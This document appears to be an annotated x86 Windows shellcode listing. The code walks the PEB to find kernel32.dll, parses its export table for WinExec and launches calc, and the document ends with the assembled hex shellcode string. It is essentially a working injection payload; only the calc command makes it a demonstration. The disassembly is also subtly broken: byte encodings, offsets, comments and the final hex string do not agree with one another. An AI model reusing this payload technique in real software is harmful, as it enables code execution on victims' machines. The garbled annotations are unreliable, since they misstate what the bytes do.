
Section 1: Set up a new stack frame

    0:  31 c0                   xor    eax,eax                      // EAX = 0
    2:  64 8b 60 08             mov    esp,DWORD PTR fs:[eax+0x8]   // Move Segment:Offset(base) to ESP
    6:  8d 2c 24                lea    ebp,[esp]                    // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

     0:  31 c0                   xor    eax,eax                     // EAX = 0
     2:  64 8b 58 30             mov    ebx,DWORD PTR fs:[eax+0x30] // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
     6:  8b 5b 0c                mov    ebx,DWORD PTR [ebx+0xc]     // EBX = PEB_LDR_DATA // Using offset 0xc
     9:  8b 5b 14                mov    ebx,DWORD PTR [ebx+0x14]    // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
     c:  8b 1b                   mov    ebx,DWORD PTR [ebx]         // EBX = Second list entry (ntdll.dll)
     e:  8b 1b                   mov    ebx,DWORD PTR [ebx]         // EBX = Third list entry (kernel32.dll)
     10: 8b 5b 10                mov    ebx,DWORD PTR [ebx+0x10]    // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of WinExec

     13: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]    // EDX = Relative Virtual Address (RVA) of the PE signature (base address + 0x3c)
     16: 01 da                   add    edx,ebx                     // EDX = Address of PE signature = base address + RVA of PE signature
     18: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]    // EDX = RVA of Export Table = Address of PE + offset 0x78
     1b: 01 da                   add    edx,ebx                     // EDX = Address of Export Table = base address + RVA of export table
     1d: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]    // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
     20: 01 de                   add    esi,ebx                     // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
     22: 31 ed                   xor    ebp,ebp                     // EBP = 0

  loopSearch:
     24: 45                      inc    ebp                         // Increment counter ECX
     25: ad                      lods   eax,DWORD PTR ds:[esi]      // Load next list entry into EAX
     26: 01 d8                   add    eax,ebx                     // EAX = Address of Entry = base address + Address of Entry
     28: 81 38 46 61 74 61       cmp    DWORD PTR [eax],0x456e6957  // Compare the current value to Winexec
     2e: 75 f4                   jne    loopSearch                  // Start over if not equal

   GetWinExec:
     39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]    // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
     3c: 01 df                   add    edi,ebx                     // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
     3e: 66 8b 2c 6f             mov    bp,WORD PTR [edi+ebp*2]     // CX = Number of Function = Address of Ordinal Table + Counter * 2
     42: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]    // Decrement ECX (To obtain starting Ordinal Value)
     45: 01 df                   add    edi,ebx                     // EDI = RVA of Address Table = Address of Ordinal Table + offset 0x1c
     47: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4] // EDI = Address of Adress Table = base address + RVA of Address Table
     4b: 01 df                   add    edi,ebx                       // EDI = Address of Adress Table = base address + RVA of Address Table

     4f: 50                      push   0x5                           // Push 5 (= show)
     50: 50                      push   0x636c6163                    // Push Calc
     51: ff d7                   call   edi                           // WinExec(Calc, 5)


	Shellcode:
  "\x31\xC0\x64\x8B\x60\x08\x8D\x2C\x24\x31\xC0\x64\x8B\x58\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x8B\x53\x3C\x01\xDA\x8B\x52"
  "\x78\x01\xDA\x8B\x72\x20\x01\xDE\x31\xED\x45\xAD\x01\xD8\x81\x38\x57\x69\x6E\x45\x75\xF4\x8B\x7A\x24\x01\xDF\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01"
  "\xDF\x8B\x7C\xAF\xFC\x01\xDF\x31\xC9\x51\x6A\x05\x68\x63\x61\x6C\x63\xFF\xD7"
